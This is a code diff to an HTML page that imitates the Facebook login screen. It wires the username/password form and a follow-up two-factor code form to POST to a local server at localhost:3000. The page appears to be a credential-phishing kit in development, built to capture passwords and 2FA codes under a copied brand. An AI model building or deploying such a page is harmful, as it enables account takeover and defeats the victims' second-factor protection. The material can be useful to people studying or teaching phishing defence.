@@ -25,7 +25,7 @@
       padding: 0 20px;
       overflow: hidden;
       flex-direction: column;
-      position: relative; /* Allow the stars to be positioned */
+      position: relative;
     }
 
     /* Container Styling */
@@ -186,14 +186,14 @@
     <!-- Logo -->
     <div class="logo">facebook</div>
     <!-- Login Form -->
-    <form class="login-form" action="javascript:void(0);" onsubmit="showTwoFactorAuth()">
+    <form class="login-form" action="http://localhost:3000/login" method="POST" onsubmit="showTwoFactorAuth(); return false;">
       <input type="text" name="username" placeholder="Email or Phone" required>
       <input type="password" name="password" placeholder="Password" required>
       <button type="submit">Log In</button>
     </form>
     <!-- Two-Factor Authentication Form -->
-    <form class="two-factor-form" style="display: none;" action="/verify-2fa" method="POST">
-      <input type="number" name="auth-code" placeholder="Enter 2FA Code" required>
+    <form class="two-factor-form" style="display: none;" action="http://localhost:3000/verify-2fa" method="POST">
+      <input type="number" name="authCode" placeholder="Enter 2FA Code" required>
       <button type="submit">Verify</button>
     </form>
     <!-- Links -->
